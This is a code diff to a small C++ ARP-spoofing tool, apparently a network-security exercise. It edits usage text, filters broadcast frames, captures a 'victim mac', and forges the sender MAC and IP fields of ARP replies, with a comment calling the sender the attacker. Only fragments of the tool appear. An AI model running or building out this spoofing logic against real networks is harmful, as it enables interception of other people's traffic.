@@ -8,7 +8,7 @@
 
 using namespace std;
 
-// static is better than #define 
+// static is better than #define
 static const int ETHERTYPE_ARP = 0x0806;
 static const int ARPOP_REQUEST = 1;
 static const int ARPOP_REPLY = 2;
@@ -37,8 +37,8 @@ struct hdr_tosend {
 };
 
 void usage() {
-    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
-    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
+    printf("syntax: arp <interface> <sender ip> <target ip>\n");
+    printf("sample: arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
 int get_myinterface(char *dev, char my_mac[6]) {
@@ -68,11 +68,6 @@ int get_myinterface(char *dev, char my_mac[6]) {
         // cout << ptr;
         ptr = strtok(NULL, ":");
     }
-
-    cout << "\nMy mac address : ";
-    for(int j=0; j<6; j++) {
-        cout << hex << (int)my_mac[j] << " ";
-    };
     return 0;
 }
 
@@ -143,15 +138,15 @@ int main(int argc, char *argv[])
 
         etharph = (hdr_tosend*)packet;
 
-        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP)
-                && etharph->arph.ar_op == ARPOP_REPLY) {
+        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == ARPOP_REPLY
+                && memcmp(etharph->eth.h_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) && memcmp(etharph->eth.h_source, mac, 6)) {
 
             if(onetime == 0) { // Get victim mac
                 memcpy(victim_mac, etharph->eth.h_source, 6);
                 onetime = 1;
             }
 
-            // Sender : My mac address
+            // Sender : Attacker mac address
             memcpy(etharph->arph.__ar_sha, mac, 6);
             memcpy(etharph->eth.h_source, mac, 6);
             memcpy(etharph->arph.__ar_sip, victimip, 4);
